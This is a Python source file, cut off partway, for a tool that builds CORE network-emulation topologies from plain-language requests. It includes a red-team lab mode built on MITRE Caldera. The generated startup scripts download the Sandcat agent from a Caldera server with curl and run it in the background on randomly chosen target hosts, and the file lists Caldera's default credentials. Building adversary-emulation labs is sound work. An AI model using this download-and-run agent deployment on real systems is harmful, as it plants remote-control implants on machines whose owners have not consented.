"""
Topology Generator - Converts natural language to CORE network topologies.

NETWORK ENGINEERING RULES (enforced by this generator):
==========================================

1. LAYER 2 DEVICES (Switch/Hub):
   - All connected devices MUST be on the same subnet
   - Switches/hubs cannot route between different subnets
   - Example: All hosts on switch use 10.0.1.2/24, 10.0.1.3/24, 10.0.1.4/24

2. LAYER 3 DEVICES (Routers):
   - Each router-to-router link is a separate subnet
   - Each router interface to different networks uses different subnets
   - Example: R1-R2 link uses 10.0.1.0/24, R2-R3 link uses 10.0.2.0/24

3. STAR TOPOLOGY:
   - If central node is Switch/Hub → same subnet for all spokes
   - If central node is Router → different subnet for each spoke

4. WIRELESS NETWORKS:
   - All nodes on same WLAN are on the same subnet
   - WLAN operates at Layer 2 (like a wireless switch)

5. DHCP/STATIC ADDRESSING:
   - Hosts use DHCP or static addresses within their subnet
   - Routers use static addresses on their interfaces

These rules can be overridden by explicit user specifications.
"""

import re
from dataclasses import dataclass, field
from typing import Dict, List, Optional
import xml.etree.ElementTree as ET
from xml.dom import minidom


# =============================================================================
# CORE-COMPATIBLE DOCKER IMAGE REGISTRY
# =============================================================================
# Each entry defines a Docker image that has been wrapped for CORE compatibility.
# These images have iproute2, ethtool, iputils-ping, net-tools, tcpdump installed.
#
# To add a new image:
# 1. Create Dockerfile wrapping the base image (see dockerfiles/Dockerfile.nginx-core)
# 2. Build it: docker build -t <name>-core -f Dockerfile.<name>-core .
# 3. Add entry here with metadata
# =============================================================================

DOCKER_IMAGE_REGISTRY = {
    "nginx": {
        "image": "nginx-core",
        "base_image": "nginx:latest",
        "description": "Nginx web server - serves HTTP on port 80",
        "default_services": [],  # Nginx runs via entrypoint, not CORE services
        "ports": [80, 443],
        "category": "web",
        "keywords": ["nginx", "web", "http", "webserver", "web server"],
    },
    "ubuntu": {
        "image": "ubuntu:22.04",
        "base_image": "ubuntu:22.04",
        "description": "Ubuntu base image for general purpose containers",
        "default_services": [],
        "ports": [],
        "category": "base",
        "keywords": ["ubuntu", "linux", "base", "general"],
    },
    "alpine": {
        "image": "alpine:latest",
        "base_image": "alpine:latest",
        "description": "Lightweight Alpine Linux",
        "default_services": [],
        "ports": [],
        "category": "base",
        "keywords": ["alpine", "lightweight", "minimal"],
    },
    "caldera": {
        "image": "caldera-mcp-core",
        "base_image": "mitre/caldera (built from source with MCP plugin)",
        "description": "MITRE Caldera adversary emulation platform with MCP plugin - Web UI on port 8888, default creds: red/admin or blue/admin",
        "default_services": [],
        "ports": [8888, 7010, 7011, 7012, 8022, 5000],
        "category": "security",
        "keywords": ["caldera", "mitre", "adversary", "red team", "security", "c2", "attack", "apt", "emulation"],
    },
}


def get_docker_image(name: str) -> Optional[Dict]:
    """
    Look up a Docker image by name or keyword.
    Returns the image configuration or None if not found.
    """
    name_lower = name.lower()

    # Direct match
    if name_lower in DOCKER_IMAGE_REGISTRY:
        return DOCKER_IMAGE_REGISTRY[name_lower]

    # Keyword match
    for img_name, config in DOCKER_IMAGE_REGISTRY.items():
        if any(kw in name_lower for kw in config.get("keywords", [])):
            return config

    return None


def list_available_docker_images() -> List[Dict]:
    """Return list of all available Docker images with their metadata."""
    return [
        {"name": name, **config}
        for name, config in DOCKER_IMAGE_REGISTRY.items()
    ]


@dataclass
class NodeConfig:
    """Configuration for a network node."""
    node_id: int
    name: str
    node_type: str  # router, switch, hub, host, pc, mdr, wireless, emane, docker
    x: float = 100.0
    y: float = 100.0
    model: Optional[str] = None
    image: Optional[str] = None
    services: List[str] = field(default_factory=list)


@dataclass
class LinkConfig:
    """Configuration for a link between nodes."""
    node1_id: int
    node2_id: int
    iface1_id: Optional[int] = None
    iface2_id: Optional[int] = None
    ip4_1: Optional[str] = None
    ip4_2: Optional[str] = None
    bandwidth: int = 100000000  # 100 Mbps
    delay: int = 0  # microseconds
    loss: float = 0.0  # percentage
    jitter: int = 0  # microseconds


@dataclass
class ServiceConfig:
    """Configuration for a service on a node."""
    node_id: int
    service_name: str
    config: Dict[str, str] = field(default_factory=dict)


@dataclass
class StartupScript:
    """Configuration for a startup script on a node."""
    node_id: int
    script_content: str
    delay_seconds: int = 0  # Delay before running the script


@dataclass
class WLANConfig:
    """Configuration for a WLAN node."""
    node_id: int
    range_meters: int = 275
    bandwidth: int = 54000000
    delay: int = 20000
    jitter: int = 0
    loss: float = 0.0


class TopologyGenerator:
    """
    Generates CORE network topologies from natural language descriptions
    or programmatic API calls.
    """

    def __init__(self):
        self.nodes: Dict[int, NodeConfig] = {}
        self.links: List[LinkConfig] = []
        self.wlan_configs: Dict[int, WLANConfig] = {}
        self.startup_scripts: Dict[int, StartupScript] = {}  # node_id -> StartupScript
        self.session_name: str = "Generated Topology"
        self.next_subnet_id: int = 0

        # Caldera/Sandcat deployment tracking
        self.caldera_server_ip: Optional[str] = None
        self.sandcat_deployment: Optional[Dict] = None
        self.auto_deploy: bool = True  # Auto-deploy agents when session starts

        # Canvas dimensions for proper layout (fits typical screen)
        self.canvas_width = 1000
        self.canvas_height = 700
        self.center_x = self.canvas_width / 2
        self.center_y = self.canvas_height / 2
        self.margin = 80  # Keep nodes away from edges

    def clear(self):
        """Clear all topology data."""
        self.nodes.clear()
        self.links.clear()
        self.wlan_configs.clear()
        self.startup_scripts.clear()
        self.caldera_server_ip = None
        self.sandcat_deployment = None
        self.next_subnet_id = 0

    def add_startup_script(self, node_id: int, script_content: str, delay_seconds: int = 0):
        """Add a startup script to a node that runs when the session starts."""
        self.startup_scripts[node_id] = StartupScript(
            node_id=node_id,
            script_content=script_content,
            delay_seconds=delay_seconds
        )

    def add_node(self, node: NodeConfig):
        """Add a node to the topology."""
        self.nodes[node.node_id] = node

    def add_link(self, link: LinkConfig):
        """Add a link to the topology."""
        self.links.append(link)

    def set_wlan_config(self, node_id: int, **kwargs):
        """Configure a WLAN node."""
        if node_id not in self.wlan_configs:
            self.wlan_configs[node_id] = WLANConfig(node_id=node_id)
        for key, value in kwargs.items():
            setattr(self.wlan_configs[node_id], key, value)

    def get_node_name(self, node_id: int) -> str:
        """Get node name by ID."""
        return self.nodes.get(node_id, NodeConfig(node_id, f"n{node_id}", "unknown")).name

    def generate_from_description(self, description: str) -> str:
        """
        Generate a topology from a natural language description.

        Examples:
        - "Create a simple network with 3 routers connected in a line"
        - "Build a star topology with a switch in the center and 5 hosts"
        - "Make a wireless mesh network with 4 MDR nodes"
        - "Create a tailscale mesh with 5 docker nodes running tailscale"
        - "Create 3 nginx web servers with 2 clients"
        - "Build a web server farm with 5 nginx containers"
        """
        description_lower = description.lower()

        # Parse node count
        node_count = self._extract_number(description_lower, default=3)

        # =================================================================
        # Check for Docker application keywords FIRST (most specific match)
        # =================================================================
        # Check each registered Docker image for keyword matches
        for app_name, config in DOCKER_IMAGE_REGISTRY.items():
            keywords = config.get("keywords", [])
            if any(kw in description_lower for kw in keywords):
                return self._generate_docker_app_topology(node_count, description, app_name)

        # =================================================================
        # Standard topology type detection
        # =================================================================
        if "star" in description_lower or "hub" in description_lower:
            return self._generate_star_topology(node_count, description)
        elif "mesh" in description_lower and "wireless" in description_lower:
            return self._generate_wireless_mesh(node_count, description)
        elif "mesh" in description_lower and ("tailscale" in description_lower or "docker" in description_lower):
            return self._generate_tailscale_mesh(node_count, description)
        elif "line" in description_lower or "chain" in description_lower:
            return self._generate_line_topology(node_count, description)
        elif "ring" in description_lower:
            return self._generate_ring_topology(node_count, description)
        else:
            # Default to simple network with switch
            return self._generate_star_topology(node_count, description)

    def _extract_number(self, text: str, default: int = 3) -> int:
        """Extract a number from text."""
        # Look for patterns like "3 routers", "five hosts", etc.
        word_to_num = {
            "one": 1, "two": 2, "three": 3, "four": 4, "five": 5,
            "six": 6, "seven": 7, "eight": 8, "nine": 9, "ten": 10
        }

        # Try to find digit
        match = re.search(r'\b(\d+)\b', text)
        if match:
            return int(match.group(1))

        # Try to find word
        for word, num in word_to_num.items():
            if word in text:
                return num

        return default

    def _generate_star_topology(self, node_count: int, description: str) -> str:
        """
        Generate a star topology following network engineering rules.

        Rules:
        - If central node is Switch/Hub (Layer 2): All spokes on SAME subnet
        - If central node is Router (Layer 3): Each spoke on DIFFERENT subnet
        """
        self.clear()

        # Determine central node type
        desc_lower = description.lower()
        if "switch" in desc_lower:
            central_type = "switch"
            central_name = "switch1"
        elif "hub" in desc_lower:
            central_type = "hub"
            central_name = "hub1"
        elif "router" in desc_lower and "center" in desc_lower:
            central_type = "router"
            central_name = "router1"
        else:
            # Default to switch for star topology
            central_type = "switch"
            central_name = "switch1"

        # Create central node
        is_layer2_central = central_type in ["switch", "hub"]

        if central_type == "router":
            services = ["zebra", "OSPFv2", "OSPFv3", "IPForward"]
        else:
            services = []

        central_node = NodeConfig(
            node_id=1,
            name=central_name,
            node_type=central_type,
            x=self.center_x,
            y=self.center_y,
            services=services
        )
        self.add_node(central_node)

        # Create peripheral nodes (routers or hosts)
        node_type = "router" if "router" in desc_lower and "center" not in desc_lower else "host"
        services = ["DefaultRoute"] if node_type == "host" else ["zebra", "OSPFv2", "OSPFv3", "IPForward"]

        # Calculate radius based on node count (more nodes = larger circle)
        import math
        base_radius = 180
        radius = min(base_radius + (node_count * 10),
                    (min(self.canvas_width, self.canvas_height) / 2) - self.margin)

        for i in range(node_count):
            angle = (2 * math.pi * i) / node_count - (math.pi / 2)  # Start from top
            x = self.center_x + radius * math.cos(angle)
            y = self.center_y + radius * math.sin(angle)

            node = NodeConfig(
                node_id=i + 2,
                name=f"{node_type}{i+1}",
                node_type=node_type,
                x=x,
                y=y,
                services=services
            )
            self.add_node(node)

            # Link to central node with proper IP addressing
            # CRITICAL RULE: Layer 2 devices (switch/hub) = same subnet for all
            #                Layer 3 devices (router) = different subnet per spoke
            if is_layer2_central:
                # Same subnet for all (10.0.1.0/24)
                link = LinkConfig(
                    node1_id=1,
                    node2_id=i + 2,
                    ip4_2=f"10.0.1.{i+2}",  # All on 10.0.1.0/24
                    bandwidth=100000000
                )
            else:
                # Different subnet for each spoke (10.0.1.0/24, 10.0.2.0/24, etc.)
                link = LinkConfig(
                    node1_id=1,
                    node2_id=i + 2,
                    ip4_1=f"10.0.{i+1}.1",   # Router interface
                    ip4_2=f"10.0.{i+1}.2",   # Spoke device interface
                    bandwidth=100000000
                )
            self.add_link(link)

        return f"Created star topology with 1 {central_type} and {node_count} {node_type}s"

    def _generate_line_topology(self, node_count: int, description: str) -> str:
        """
        Generate a line/chain topology following network engineering rules.

        Rules:
        - Routers: Each link is a separate subnet (router-to-router links)
        - Hosts: All on same subnet (hosts typically don't route)
        """
        self.clear()

        node_type = "router" if "router" in description.lower() else "host"
        services = ["DefaultRoute"] if node_type == "host" else ["zebra", "OSPFv2", "OSPFv3", "IPForward"]
        is_router = node_type == "router"

        # Calculate spacing to fit all nodes horizontally
        usable_width = self.canvas_width - (2 * self.margin)
        spacing = usable_width / max(node_count - 1, 1) if node_count > 1 else 0

        for i in range(node_count):
            node = NodeConfig(
                node_id=i + 1,
                name=f"{node_type}{i+1}",
                node_type=node_type,
                x=self.margin + (i * spacing),
                y=self.center_y,
                services=services
            )
            self.add_node(node)

            if i > 0:
                if is_router:
                    # Routers: Each link is separate subnet
                    link = LinkConfig(
                        node1_id=i,
                        node2_id=i + 1,
                        ip4_1=f"10.0.{i}.1",
                        ip4_2=f"10.0.{i}.2"
                    )
                else:
                    # Hosts: All on same subnet (10.0.1.0/24)
                    link = LinkConfig(
                        node1_id=i,
                        node2_id=i + 1,
                        ip4_1=f"10.0.1.{i}",
                        ip4_2=f"10.0.1.{i+1}"
                    )
                self.add_link(link)

        return f"Created line topology with {node_count} {node_type}s"

    def _generate_ring_topology(self, node_count: int, description: str) -> str:
        """
        Generate a ring topology following network engineering rules.

        Rules:
        - Routers: Each link is a separate subnet (router-to-router links)
        - Hosts: All on same subnet (hosts typically don't route)
        """
        self.clear()

        node_type = "router" if "router" in description.lower() else "host"
        services = ["DefaultRoute"] if node_type == "host" else ["zebra", "OSPFv2", "OSPFv3", "IPForward"]
        is_router = node_type == "router"

        import math
        # Calculate radius based on node count
        base_radius = 180
        radius = min(base_radius + (node_count * 8),
                    (min(self.canvas_width, self.canvas_height) / 2) - self.margin)

        for i in range(node_count):
            angle = (2 * math.pi * i) / node_count - (math.pi / 2)  # Start from top
            x = self.center_x + radius * math.cos(angle)
            y = self.center_y + radius * math.sin(angle)

            node = NodeConfig(
                node_id=i + 1,
                name=f"{node_type}{i+1}",
                node_type=node_type,
                x=x,
                y=y,
                services=services
            )
            self.add_node(node)

            # Link to previous node
            if i > 0:
                if is_router:
                    # Routers: Each link is separate subnet
                    link = LinkConfig(
                        node1_id=i,
                        node2_id=i + 1,
                        ip4_1=f"10.0.{i}.1",
                        ip4_2=f"10.0.{i}.2"
                    )
                else:
                    # Hosts: All on same subnet (10.0.1.0/24)
                    link = LinkConfig(
                        node1_id=i,
                        node2_id=i + 1,
                        ip4_1=f"10.0.1.{i}",
                        ip4_2=f"10.0.1.{i+1}"
                    )
                self.add_link(link)

        # Close the ring
        if node_count > 2:
            if is_router:
                # Routers: Separate subnet for closing link
                link = LinkConfig(
                    node1_id=node_count,
                    node2_id=1,
                    ip4_1=f"10.0.{node_count}.1",
                    ip4_2=f"10.0.{node_count}.2"
                )
            else:
                # Hosts: Same subnet for closing link
                link = LinkConfig(
                    node1_id=node_count,
                    node2_id=1,
                    ip4_1=f"10.0.1.{node_count}",
                    ip4_2=f"10.0.1.1"
                )
            self.add_link(link)

        return f"Created ring topology with {node_count} {node_type}s"

    def _generate_wireless_mesh(self, node_count: int, description: str) -> str:
        """Generate a wireless mesh network."""
        self.clear()

        # Create WLAN node
        wlan = NodeConfig(
            node_id=1,
            name="wlan1",
            node_type="wireless",
            x=self.center_x,
            y=self.center_y
        )
        self.add_node(wlan)
        self.set_wlan_config(1, range_meters=500, bandwidth=54000000)

        # Create MDR nodes
        import math
        # Calculate radius based on node count
        base_radius = 150
        radius = min(base_radius + (node_count * 8),
                    (min(self.canvas_width, self.canvas_height) / 2) - self.margin)

        for i in range(node_count):
            angle = (2 * math.pi * i) / node_count - (math.pi / 2)  # Start from top
            x = self.center_x + radius * math.cos(angle)
            y = self.center_y + radius * math.sin(angle)

            node = NodeConfig(
                node_id=i + 2,
                name=f"mdr{i+1}",
                node_type="mdr",
                model="mdr",
                x=x,
                y=y,
                services=["zebra", "OSPFv3MDR", "IPForward"]
            )
            self.add_node(node)

            # Link to WLAN
            link = LinkConfig(
                node1_id=1,
                node2_id=i + 2,
                ip4_2=f"10.0.0.{i+2}"
            )
            self.add_link(link)

        return f"Created wireless mesh with 1 WLAN and {node_count} MDR nodes"

    def _generate_tailscale_mesh(self, node_count: int, description: str) -> str:
        """Generate a tailscale mesh network with Docker nodes."""
        self.clear()

        # Create nodes with tailscale
        for i in range(node_count):
            x = 100.0 + (i % 3) * 200
            y = 100.0 + (i // 3) * 200

            node = NodeConfig(
                node_id=i + 1,
                name=f"tailscale{i+1}",
                node_type="docker",
                image="ubuntu:22.04",
                x=x,
                y=y,
                services=[]  # Custom tailscale service would be added here
            )
            self.add_node(node)

        return f"Created tailscale mesh with {node_count} Docker nodes (tailscale service needs to be configured separately)"

    def _generate_docker_app_topology(self, node_count: int, description: str, app_name: str) -> str:
        """
        Generate a topology with Docker application nodes (nginx, etc.) connected via switch.

        This creates a realistic server farm / web cluster topology:
        - Central switch for Layer 2 connectivity
        - Multiple Docker app nodes (e.g., nginx web servers)
        - Optional client hosts for testing
        - All on same subnet (proper Layer 2 networking)

        Args:
            node_count: Number of app containers to create
            description: Original natural language description
            app_name: Name of the app (used to look up image in registry)
        """
        self.clear()
        import math

        # Look up the Docker image configuration
        docker_config = get_docker_image(app_name)
        if not docker_config:
            # Fallback to generic ubuntu if app not found
            docker_config = DOCKER_IMAGE_REGISTRY["ubuntu"]
            image_name = "ubuntu:22.04"
            app_display_name = "docker"
        else:
            image_name = docker_config["image"]
            app_display_name = app_name.lower()

        desc_lower = description.lower()

        # Check if user wants clients/targets too
        # For security tools (caldera, etc.), "targets", "victims", "hosts" are clients
        include_clients = any(word in desc_lower for word in [
            "client", "clients", "test", "browser",
            "target", "targets", "victim", "victims", "host", "hosts", "agent", "agents"
        ])

        # Determine if this is a "1 server + N targets" pattern
        # e.g., "1 caldera server with 3 targets" or "caldera with 5 target hosts"
        is_server_with_targets = any(word in desc_lower for word in [
            "target", "targets", "victim", "victims", "agent", "agents"
        ]) and docker_config.get("category") == "security"

        if is_server_with_targets:
            # For security tools: 1 server, N targets
            # Extract target count from description
            # Look for number before target/victim/host keywords
            import re
            target_match = re.search(r'(\d+)\s*(?:target|victim|host|agent)', desc_lower)
            if target_match:
                client_count = int(target_match.group(1))
            else:
                client_count = node_count  # Use the main count as target count
            node_count = 1  # Only 1 server (caldera, etc.)
        else:
            # Normal client detection
            client_count = self._extract_number(desc_lower.split("client")[0], default=0) if include_clients else 0
            if include_clients and client_count == 0:
                client_count = 2  # Default 2 clients if mentioned but no count

        # Create central switch
        switch_node = NodeConfig(
            node_id=1,
            name="switch1",
            node_type="switch",
            x=self.center_x,
            y=self.center_y,
            services=[]
        )
        self.add_node(switch_node)

        # Calculate layout - app nodes on top half, clients on bottom
        total_app_nodes = node_count
        app_radius = min(180 + (total_app_nodes * 10),
                        (min(self.canvas_width, self.canvas_height) / 2) - self.margin)

        # Create Docker app nodes (e.g., nginx servers)
        current_node_id = 2
        for i in range(total_app_nodes):
            # Arrange in arc on top half
            angle = math.pi + (math.pi * (i + 1)) / (total_app_nodes + 1)  # Top arc
            x = self.center_x + app_radius * math.cos(angle)
            y = self.center_y + app_radius * math.sin(angle)

            node = NodeConfig(
                node_id=current_node_id,
                name=f"{app_display_name}{i+1}",
                node_type="docker",
                image=image_name,
                x=x,
                y=y,
                services=docker_config.get("default_services", [])
            )
            self.add_node(node)

            # Link to switch - all on same subnet (Layer 2 rule)
            link = LinkConfig(
                node1_id=1,
                node2_id=current_node_id,
                ip4_2=f"10.0.1.{current_node_id}",  # 10.0.1.2, 10.0.1.3, etc.
                bandwidth=100000000
            )
            self.add_link(link)
            current_node_id += 1

        # Create client/target hosts if requested
        # For Caldera, track how many targets should have Sandcat agents
        caldera_server_ip = None
        sandcat_targets = []

        if is_server_with_targets and app_display_name == "caldera":
            # Caldera server is node 2 (first after switch), gets IP 10.0.1.2
            caldera_server_ip = "10.0.1.2"
            # Store metadata about the Caldera deployment
            self.caldera_server_ip = caldera_server_ip

        if client_count > 0:
            # Use "target" naming for security tools, "client" for others
            host_prefix = "target" if is_server_with_targets else "client"
            client_radius = app_radius * 0.8

            # Determine how many targets get Sandcat agents (random selection)
            # By default, deploy on 50-100% of targets randomly
            import random
            num_agents = max(1, random.randint(client_count // 2, client_count))
            agent_indices = set(random.sample(range(client_count), num_agents))

            for i in range(client_count):
                # Arrange in arc on bottom half
                angle = (math.pi * (i + 1)) / (client_count + 1)  # Bottom arc
                x = self.center_x + client_radius * math.cos(angle)
                y = self.center_y + client_radius * math.sin(angle)

                target_ip = f"10.0.1.{current_node_id}"

                # Check if this target should have a Sandcat agent
                has_agent = (i in agent_indices) and caldera_server_ip

                node = NodeConfig(
                    node_id=current_node_id,
                    name=f"{host_prefix}{i+1}",
                    node_type="host",
                    x=x,
                    y=y,
                    services=["DefaultRoute"]
                )
                self.add_node(node)

                if has_agent:
                    sandcat_targets.append({
                        "name": f"{host_prefix}{i+1}",
                        "ip": target_ip,
                        "node_id": current_node_id
                    })

                # Link to switch - same subnet as servers
                link = LinkConfig(
                    node1_id=1,
                    node2_id=current_node_id,
                    ip4_2=target_ip,
                    bandwidth=100000000
                )
                self.add_link(link)
                current_node_id += 1

        # Store Sandcat deployment info for later use
        if sandcat_targets:
            self.sandcat_deployment = {
                "caldera_server_ip": caldera_server_ip,
                "targets": sandcat_targets
            }

            # Add automatic startup scripts if auto_deploy is enabled
            if self.auto_deploy and caldera_server_ip:
                # Add startup script for Caldera server (node 2)
                caldera_startup = f'''#!/bin/bash
# Auto-start Caldera server
echo "[CALDERA] Starting Caldera server..."
nohup /start-caldera.sh > /tmp/caldera.log 2>&1 &
echo "[CALDERA] Caldera starting in background (log: /tmp/caldera.log)"
'''
                self.add_startup_script(2, caldera_startup, delay_seconds=0)

                # Add startup scripts for Sandcat agents with delay
                # Agents wait 90 seconds for Caldera to be ready, then deploy
                for target in sandcat_targets:
                    sandcat_startup = f'''#!/bin/bash
# Auto-deploy Sandcat agent after Caldera is ready
CALDERA_URL="http://{caldera_server_ip}:8888"
DELAY=90

echo "[SANDCAT] Waiting ${{DELAY}}s for Caldera to start..."
sleep $DELAY

# Check if Caldera is ready
for attempt in $(seq 1 30); do
    if curl -s -o /dev/null -w "%{{http_code}}" $CALDERA_URL 2>/dev/null | grep -q "200"; then
        echo "[SANDCAT] Caldera is ready, deploying agent..."
        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$CALDERA_URL/file/download" -o /tmp/sandcat
        if [ -f /tmp/sandcat ] && [ -s /tmp/sandcat ]; then
            chmod +x /tmp/sandcat
            nohup /tmp/sandcat -server "$CALDERA_URL" -group red -v > /tmp/sandcat.log 2>&1 &
            echo "[SANDCAT] Agent deployed successfully (PID: $!)"
            exit 0
        else
            echo "[SANDCAT] Failed to download agent"
            exit 1
        fi
    fi
    echo "[SANDCAT] Waiting for Caldera... (attempt $attempt/30)"
    sleep 5
done
echo "[SANDCAT] Caldera not ready after $((DELAY + 150))s, giving up"
'''
                    self.add_startup_script(target["node_id"], sandcat_startup, delay_seconds=0)

        # Build result message
        ports_info = ""
        if docker_config.get("ports"):
            ports_info = f" (listening on ports: {', '.join(map(str, docker_config['ports']))})"

        result = f"Created {app_display_name} topology with {total_app_nodes} {app_display_name} server(s){ports_info}"
        if client_count > 0:
            # Use "target host(s)" for security tools, "client host(s)" for others
            client_label = "target host(s)" if is_server_with_targets else "client host(s)"
            result += f" and {client_count} {client_label}"
        result += " connected via switch (all on 10.0.1.0/24)"

        # Add Sandcat agent deployment info
        if sandcat_targets:
            agent_names = [t["name"] for t in sandcat_targets]
            result += f"\n\n=== CALDERA RED TEAM DEPLOYMENT ==="
            result += f"\nCaldera server: caldera1 @ {caldera_server_ip}:8888"
            result += f"\nCredentials: red/admin or blue/admin"
            result += f"\nTarget hosts with agents: {', '.join(agent_names)}"

            if self.auto_deploy:
                result += f"\n\n=== AUTO-DEPLOYMENT ENABLED ==="
                result += f"\nWhen you start the session, everything will deploy automatically:"
                result += f"\n  1. Caldera server starts immediately"
                result += f"\n  2. After ~90 seconds, Sandcat agents deploy on target hosts"
                result += f"\n  3. Agents beacon back to Caldera at {caldera_server_ip}:8888"
                result += f"\n\nJust start the session and wait ~2 minutes for agents to appear!"
            else:
                result += f"\n\n=== MANUAL DEPLOYMENT ==="
                result += f"\nRun this command in the CORE container terminal to deploy:"
                result += f"\n"
                result += f"\n  /tmp/deploy-caldera-agents.sh <SESSION_ID> caldera1 {caldera_server_ip}"
                result += f"\n"
                result += f"\n(Replace <SESSION_ID> with the actual session number, usually 1)"

        return result

    def get_summary(self) -> str:
        """Get a summary of the current topology."""
        summary = f"Topology: {self.session_name}\n"
        summary += f"Nodes: {len(self.nodes)}\n"
        for node_id, node in self.nodes.items():
            summary += f"  - {node.name} (ID: {node_id}, Type: {node.node_type})\n"
        summary += f"Links: {len(self.links)}\n"
        for i, link in enumerate(self.links):
            node1 = self.get_node_name(link.node1_id)
            node2 = self.get_node_name(link.node2_id)
            summary += f"  - {node1} <-> {node2}\n"
        return summary

    def to_python_script(self) -> str:
        """Generate a Python script using CORE gRPC API."""
        script = """#!/usr/bin/env python3
\"\"\"
CORE Network Topology - Auto-generated script
\"\"\"

from core.api.grpc import client
from core.api.grpc.wrappers import NodeType, Position, Interface

# Interface helper for IP allocation
iface_helper = client.InterfaceHelper(ip4_prefix="10.0.0.0/16", ip6_prefix="2001::/64")

# Create gRPC client and connect
core = client.CoreGrpcClient()
core.connect()

# Create session
session = core.create_session()

# Create nodes
"""

        # Add nodes
        node_type_map = {
            "router": "NodeType.DEFAULT",
            "switch": "NodeType.SWITCH",
            "hub": "NodeType.HUB",
            "host": "NodeType.DEFAULT",
            "pc": "NodeType.DEFAULT",
            "mdr": "NodeType.DEFAULT",
            "wireless": "NodeType.WIRELESS",
            "emane": "NodeType.EMANE",
            "docker": "NodeType.DOCKER"
        }

        for node_id, node in sorted(self.nodes.items()):
            node_var = f"node{node_id}"
            node_type_str = node_type_map.get(node.node_type, "NodeType.DEFAULT")

            script += f"position_{node_id} = Position(x={node.x}, y={node.y})\n"

            if node.node_type == "docker" and node.image:
                script += f'{node_var} = session.add_node({node_id}, name="{node.name}", _type={node_type_str}, position=position_{node_id}, image="{node.image}")\n'
            elif node.model:
                script += f'{node_var} = session.add_node({node_id}, name="{node.name}", _type={node_type_str}, position=position_{node_id}, model="{node.model}")\n'
            else:
                script += f'{node_var} = session.add_node({node_id}, name="{node.name}", _type={node_type_str}, position=position_{node_id})\n'

            # Add services
            if node.services:
                services_str = '", "'.join(node.services)
                script += f'{node_var}.set_services(["{services_str}"])\n'

            script += "\n"

        # Add links
        script += "# Create links\n"
        for i, link in enumerate(self.links):
            node1_var = f"node{link.node1_id}"
            node2_var = f"node{link.node2_id}"

            iface1_id = link.iface1_id if link.iface1_id is not None else 0
            iface2_id = link.iface2_id if link.iface2_id is not None else 0

            if link.ip4_1 and link.ip4_2:
                script += f'iface1_{i} = Interface(id={iface1_id}, ip4="{link.ip4_1}", ip4_mask=24)\n'
                script += f'iface2_{i} = Interface(id={iface2_id}, ip4="{link.ip4_2}", ip4_mask=24)\n'
                script += f"session.add_link(node1={node1_var}, node2={node2_var}, iface1=iface1_{i}, iface2=iface2_{i})\n\n"
            else:
                script += f"iface1_{i} = iface_helper.create_iface({link.node1_id}, {iface1_id})\n"
                script += f"iface2_{i} = iface_helper.create_iface({link.node2_id}, {iface2_id})\n"
                script += f"session.add_link(node1={node1_var}, node2={node2_var}, iface1=iface1_{i}, iface2=iface2_{i})\n\n"

        # Add WLAN configs
        if self.wlan_configs:
            script += "# Configure WLAN nodes\n"
            for node_id, wlan_config in self.wlan_configs.items():
                node_var = f"node{node_id}"
                script += f"""{node_var}.set_wlan({{
    "range": "{wlan_config.range_meters}",
    "bandwidth": "{wlan_config.bandwidth}",
    "delay": "{wlan_config.delay}",
    "jitter": "{wlan_config.jitter}",
    "error": "{wlan_config.loss}"
}})

"""

        # Start session
        script += "# Start session\ncore.start_session(session)\nprint(\"Session started successfully!\")\n"

        return script

    def to_xml(self) -> str:
        """Generate a CORE XML file."""
        root = ET.Element("scenario", name=self.session_name)

        # Networks section
        networks = ET.SubElement(root, "networks")
        devices = ET.SubElement(root, "devices")

        for node_id, node in sorted(self.nodes.items()):
            if node.node_type in ["switch", "hub", "wireless", "emane"]:
                network = ET.SubElement(networks, "network",
                    id=str(node_id),
                    name=node.name,
                    type=node.node_type.upper().replace("WIRELESS", "WIRELESS_LAN")
                )
                pos = ET.SubElement(network, "position",
                    x=str(node.x),
                    y=str(node.y),
                    lat="0.0",
                    lon="0.0",
                    alt="0.0"
                )
            else:
                # Convert node type to CORE XML format
                # "host" -> "PC" for proper icon display in CORE GUI
                # "docker" -> class="docker" (CORE uses class attribute, not type)
                if node.node_type == "host":
                    xml_type = "PC"
                    device_attrs = {
                        "id": str(node_id),
                        "name": node.name,
                        "type": xml_type
                    }
                elif node.node_type == "docker":
                    # Docker uses class="docker" with empty type, per CORE format
                    device_attrs = {
                        "id": str(node_id),
                        "name": node.name,
                        "type": "",
                        "class": "docker"
                    }
                    # Add image and docker-specific attributes
                    if node.image:
                        device_attrs["image"] = node.image
                else:
                    xml_type = node.node_type
                    device_attrs = {
                        "id": str(node_id),
                        "name": node.name,
                        "type": xml_type
                    }

                device = ET.SubElement(devices, "device", **device_attrs)
                pos = ET.SubElement(device, "position",
                    x=str(node.x),
                    y=str(node.y),
                    lat="0.0",
                    lon="0.0",
                    alt="0.0"
                )
                if node.services:
                    services_elem = ET.SubElement(device, "services")
                    for service_name in node.services:
                        ET.SubElement(services_elem, "service", name=service_name)

        # Links section - Track interface IDs per node
        iface_counters = {}  # node_id -> next_interface_id

        links_elem = ET.SubElement(root, "links")
        for link in self.links:
            # Get next interface ID for node1 and node2
            if link.node1_id not in iface_counters:
                iface_counters[link.node1_id] = 0
            if link.node2_id not in iface_counters:
                iface_counters[link.node2_id] = 0

            iface1_id = iface_counters[link.node1_id]
            iface2_id = iface_counters[link.node2_id]

            # Increment counters for next link
            iface_counters[link.node1_id] += 1
            iface_counters[link.node2_id] += 1

            link_elem = ET.SubElement(links_elem, "link",
                node1=str(link.node1_id),
                node2=str(link.node2_id)
            )

            # Add interface 1 if it has an IP
            if link.ip4_1:
                iface1 = ET.SubElement(link_elem, "iface1",
                    id=str(iface1_id),
                    name=f"eth{iface1_id}",
                    ip4=link.ip4_1,
                    ip4_mask="24"
                )

            # Add interface 2 if it has an IP
            if link.ip4_2:
                iface2 = ET.SubElement(link_elem, "iface2",
                    id=str(iface2_id),
                    name=f"eth{iface2_id}",
                    ip4=link.ip4_2,
                    ip4_mask="24"
                )

            if link.bandwidth or link.delay or link.loss:
                options = ET.SubElement(link_elem, "options",
                    bandwidth=str(link.bandwidth),
                    delay=str(link.delay),
                    loss=str(link.loss)
                )

        # Pretty print XML
        xml_str = ET.tostring(root, encoding='unicode')
        dom = minidom.parseString(xml_str)
        return dom.toprettyxml(indent="  ")

    def get_startup_scripts_json(self) -> str:
        """
        Export startup scripts as JSON for use with start_and_deploy.py.

        Returns JSON array with:
        [
            {
                "node_id": 2,
                "node_name": "caldera1",
                "script_content": "#!/bin/bash\n...",
                "delay_seconds": 0
            },
            ...
        ]
        """
        import json

        scripts = []
